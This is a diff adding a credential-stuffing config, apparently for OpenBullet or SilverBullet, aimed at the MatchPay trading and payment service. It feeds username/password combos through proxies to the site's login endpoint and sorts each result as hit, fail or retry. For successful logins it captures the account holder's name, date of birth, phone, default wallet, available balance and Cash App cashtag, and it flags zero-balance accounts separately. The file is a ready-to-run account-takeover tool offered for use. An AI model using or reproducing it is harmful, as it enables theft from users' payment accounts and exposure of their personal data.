@@ -1,0 +1,136 @@
+[SETTINGS]
+{
+  "Name": "MatchPay",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-09-01T03:33:33.3333333-07:00",
+  "AdditionalInfo": "github.com/0xSums",
+  "RequiredPlugins": [],
+  "Author": "✧",
+  "Version": "[t.me/imSums]"
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "MatchPay",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#Email→Username PARSE "<USER>" LR "" "@" -> VAR "U" 
+
+#/service/auth/login REQUEST POST "https://trade.matchpay.app/service/auth/login" 
+  CONTENT "{\"username\":\"<U>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "x-ts-ajax-request: true" 
+
+#200_OK? KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "<RESPONSECODE>" Contains "20" 
+    KEY "<SOURCE>" DoesNotContain "The requested URL was rejected. Please consult with your administrator." 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+    KEY "<RESPONSECODE>" EqualTo "423" 
+    KEY "<RESPONSECODE>" EqualTo "400" 
+  KEYCHAIN Retry OR 
+    KEY "The requested URL was rejected. Please consult with your administrator." 
+
+#profileId PARSE "<SOURCE>" JSON "profileId" -> VAR "X" 
+
+#/service/account/profiles REQUEST GET "https://trade.matchpay.app/service/account/profiles/<X>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+#firstName PARSE "<SOURCE>" JSON "firstName" -> VAR "FN" 
+
+#lastName PARSE "<SOURCE>" JSON "lastName" -> VAR "LN" 
+
+#fullName FUNCTION Constant "<FN> <LN>" -> CAP "Name" 
+
+#birthDate PARSE "<SOURCE>" JSON "birthDate" CreateEmpty=FALSE -> CAP "DOB" 
+
+#phone PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "Phone" 
+
+#/service/wallet/wallets/ REQUEST GET "https://trade.matchpay.app/service/wallet/wallets/<X>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+#MerchantWalletCode PARSE "<SOURCE>" JSON "defaultMerchantWalletCodeSelected" CreateEmpty=FALSE -> CAP "DefaultWallet" 
+
+#/balance?merchantCode= REQUEST GET "https://trade.matchpay.app/service/wallet/wallets/<X>/balance?merchantCode=<DefaultWallet>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+#/balance?merchantCode PARSE "<SOURCE>" LR "\"type\":\"AVAILABLE\"," "}" -> VAR "AVA" 
+
+#amount PARSE "<AVA>" LR "\"amount\":" "" CreateEmpty=FALSE -> CAP "Balance" "$" "" 
+
+#/settings/payment-methods REQUEST GET "https://trade.matchpay.app/service/account/profiles/<X>/settings/payment-methods" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+#"enabled":true PARSE "<SOURCE>" LR "\"enabled\":true" "type\":\"CASHTAG\"" -> VAR "CT" 
+
+#Cashtag PARSE "<CT>" LR "\"handler\":\"" "\"" CreateEmpty=FALSE -> CAP "Cashtag" 
+
+#$? KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Balance>" EqualTo "$0" 
+    KEY "<Balance>" DoesNotExist 
+
